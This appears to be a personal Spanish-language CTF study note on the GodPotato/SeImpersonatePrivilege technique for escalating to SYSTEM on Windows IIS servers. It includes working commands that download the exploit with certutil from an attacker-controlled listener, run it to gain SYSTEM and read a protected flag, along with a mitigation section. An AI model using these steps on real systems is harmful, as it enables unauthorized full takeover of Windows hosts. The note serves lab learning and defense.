---
tags: [tecnica, windows, privesc, impersonacion, godpotato, iis, potato]
tipo: tecnica
categoria: explotacion
estado: practicado
maquinas: [Welcome To The Jungle]
---

# GodPotato / SeImpersonatePrivilege (escalada a SYSTEM en Windows)

## 1. Qué es

Familia de exploits de **escalada de privilegios local a `NT AUTHORITY\SYSTEM`** en Windows que explota el privilegio **`SeImpersonatePrivilege`** del token del proceso atacante.

`GodPotato` (de `ohpe`) enruta una llamada RPC a un servicio que corre como SYSTEM y, gracias a `SeImpersonatePrivilege`, **suplanta su token**: el proceso que se lanza después ya corre como SYSTEM.

## 2. Cómo funciona

1. El atacante tiene `SeImpersonatePrivilege` (habitual en **app pools de IIS**, servicios y algunos Scheduled Tasks).
2. Se provoca a un servicio privilegiado (vía RPC) a que se conecte a un pipe/endpoint controlado por el atacante.
3. Al autenticar, el servicio entrega su token SYSTEM; `SeImpersonatePrivilege` permite adoptarlo.
4. Se crea un proceso hijo que hereda ese token → **SYSTEM**.

## 3. Cuándo sospecharla

- En un servidor **IIS/PHP** tras conseguir un webshell: el token del app pool suele traer `SeImpersonatePrivilege` + `SeAssignPrimaryTokenPrivilege`.
- Cuando se posee un binario que se ejecuta como **servicio** y no se puede escalar por otros medios.
- Requisito habitual: servicios `Spooler` y `RpcSs` en ejecución.

## 4. Cómo comprobarla (laboratorio autorizado)

```powershell
# 1) ¿El token tiene el privilegio?
whoami /priv
#   SeImpersonatePrivilege          Habilitada
#   SeAssignPrimaryTokenPrivilege   Habilitada
sc query Spooler     # → RUNNING
sc query RpcSs       # → RUNNING

# 2) Subir la herramienta (sin INTERNET en el objetivo: usar certutil contra un listener propio)
certutil -urlcache -split -f http://192.168.56.1:8000/GodPotato.exe C:\Users\Public\gp.exe

# 3) Escalar  (¡el flag -cmd es OBLIGATORIO!)
C:\Users\Public\gp.exe -cmd "cmd.exe /c whoami > C:\Users\Public\out.txt"
type C:\Users\Public\out.txt      # → nt authority\system

# 4) Leer el objetivo
C:\Users\Public\gp.exe -cmd "cmd.exe /c type C:\Users\Administrador\Desktop\root.txt > C:\Users\Public\root.txt"
```

## 5. Herramientas

- `GodPotato` (.NET, parámetro `-cmd` obligatorio) — la más fiable en Server 2019/2022.
- `PrintSpoofer` (abusa del spooler; puede colgarse y dejar procesos huérfanos).
- `SweetPotato` (específica de IIS), `JuicyPotato` (no funciona en 1809+).

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[Welcome To The Jungle]] | Webshell PHP en `panel.php` → token `IIS AppPool\DefaultAppPool` con `SeImpersonatePrivilege` → `GodPotato` | root flag como SYSTEM |

## 7. Falsos positivos / pruebas fallidas

- `PrintSpoofer` se probó **antes** que `GodPotato` en esa máquina: se quedó colgado sin generar salida y dejó **dos procesos huérfanos** que bloqueaban el borrado del `.exe` (hay que hacer `taskkill /F /IM` antes de limpiar).
- `GodPotato` **sin** `-cmd` solo imprime la ayuda y no escala (falla silenciosamente).
- Un token de usuario de escritorio normal (incluso admin) puede **no** tener `SeImpersonatePrivilege`: el privilegio hay que verificarlo, no suponerlo.

## 8. Prevención y mitigación

- **Quitar `SeImpersonatePrivilege`** de los tokens que no lo necesitan (app pools, servicios, tareas).
- Ejecutar los app pools con **identidad dedicada** y privilegio mínimo, nunca `LocalSystem`.
- Auditar qué procesos tienen `SeImpersonatePrivilege` y `SeAssignPrimaryTokenPrivilege` habilitados.
- Restringir la creación de named pipes por parte de cuentas de servicio y monitorizar las llamadas RPC a `spoolss`/`System`.
- Restringir el acceso a `C:\Windows\System32\inetsrv\` y a la configuración de app pools.

## 9. Técnicas relacionadas

- [[PHP-Webshell]]
- [[Esteganografia-WAV-LSB]]
